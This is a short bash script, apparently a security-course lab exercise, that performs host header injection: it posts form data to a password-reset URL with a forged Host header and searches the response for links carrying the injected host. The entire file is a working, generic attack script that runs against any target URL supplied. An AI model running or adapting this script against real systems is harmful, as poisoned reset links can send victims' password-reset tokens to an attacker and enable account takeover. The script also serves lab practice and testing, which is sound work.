#!/usr/bin/env bash
# 1-host_header_injection.sh
# Usage: ./1-host_header_injection.sh new_host target_url "form_data"
# Example: ./1-host_header_injection.sh new_host http://web0x00.hbtn/reset_password "email=test@test.hbtn"

set -euo pipefail

if [ "$#" -ne 3 ]; then
  echo "Usage: $0 <new_host> <target_url> <form_data>"
  echo 'Example: $0 new_host http://web0x00.hbtn/reset_password "email=test@test.hbtn"'
  exit 2
fi

NEW_HOST="$1"
TARGET_URL="$2"
FORM_DATA="$3"

# optional: timeout and user-agent
CURL_OPTS=(-sS --max-time 15 -L) # -L follow redirects if any

# Make the POST request with a forged Host header and capture response
RESPONSE=$(curl "${CURL_OPTS[@]}" -X POST \
  -H "Host: ${NEW_HOST}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "${FORM_DATA}" \
  "${TARGET_URL}" 2>/dev/null || true)

# Print a short status
echo "Sent POST to ${TARGET_URL} with Host: ${NEW_HOST} and data: ${FORM_DATA}"
echo

# Try to find injected links in the response that reference the NEW_HOST
# We'll look for href attributes or plain text occurrences (http/https)
echo "Searching response for links containing '${NEW_HOST}'..."
MATCHES=$(printf "%s" "$RESPONSE" | grep -Eo "https?://[^\"]*${NEW_HOST}[^\"]*" || true)

if [ -n "$MATCHES" ]; then
  echo "+++ Host header injection likely successful. Found the following matches:"
  printf "%s\n" "$MATCHES"
  echo
  # show the surrounding HTML lines for context (first match)
  echo "Context (around first match):"
  printf "%s" "$RESPONSE" | grep -n -m1 "${NEW_HOST}" -n -n | sed -n '1p' >/dev/null 2>&1 || true
  # fallback: print lines that contain NEW_HOST (up to 10 lines)
  printf "%s" "$RESPONSE" | grep -n "${NEW_HOST}" | sed -n '1,10p'
else
  echo "--- No obvious injected host occurrences found in response."
  # For debugging, you can uncomment to print the full response (may be large)
  # printf "%s\n" "$RESPONSE"
fi

